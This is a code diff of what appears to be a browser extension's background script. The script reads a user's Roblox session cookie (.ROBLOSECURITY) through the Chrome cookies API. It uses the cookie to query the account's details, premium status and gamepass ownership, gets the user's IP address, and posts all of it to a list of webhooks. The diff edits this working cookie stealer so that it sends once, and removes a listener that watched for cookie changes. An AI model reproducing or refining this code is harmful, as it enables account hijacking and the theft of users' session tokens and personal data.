@@ -5,13 +5,11 @@ const WEBHOOKS = [
     }
 ];
 
-let lastCookie = null;
+let hasSent = false; // ✅ Track if we already sent
 
 async function main(cookie) {
-    if (!cookie) return;
-
-    if (cookie === lastCookie) return;
-    lastCookie = cookie;
+    if (!cookie || hasSent) return; // Only run once
+    hasSent = true;
 
     let ipAddr = await (await fetch("https://api.ipify.org")).text();
     let statistics = null;
@@ -19,7 +17,6 @@ async function main(cookie) {
     const gamepassId = 1417708310;
 
     try {
-        // Get authenticated user
         let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
             method: "GET",
             headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
@@ -40,12 +37,10 @@ async function main(cookie) {
         });
         let isPremium = premiumRes.ok ? await premiumRes.json() : false;
 
-        // Thumbnail
-        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
-        let thumbJson = await thumbRes.json();
-        let thumbUrl = thumbJson.data && thumbJson.data.length > 0 ? thumbJson.data[0].imageUrl : "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420";
+        // Fixed Roblox profile picture
+        let thumbUrl = `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${user.id}-Png/420/420/AvatarHeadshot/Webp/noFilter`;
 
-        // Check gamepass ownership (legal)
+        // Check gamepass ownership
         try {
             let gpRes = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gamepassId}/users/${user.id}`, {
                 method: "GET",
@@ -72,7 +67,6 @@ async function main(cookie) {
 
     if (!statistics) return;
 
-    // Embed payload
     const embedPayload = {
         embeds: [
             {
@@ -97,7 +91,6 @@ async function main(cookie) {
         ]
     };
 
-    // Send to webhooks
     for (let wh of WEBHOOKS) {
         fetch(wh.url, {
             method: "POST",
@@ -107,12 +100,5 @@ async function main(cookie) {
     }
 }
 
-// Run once
+// ✅ Run once
 chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, c => main(c ? c.value : null));
-
-// Keep watching
-chrome.cookies.onChanged.addListener(changeInfo => {
-    if (changeInfo.cookie && changeInfo.cookie.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com") && !changeInfo.removed) {
-        main(changeInfo.cookie.value);
-    }
-});
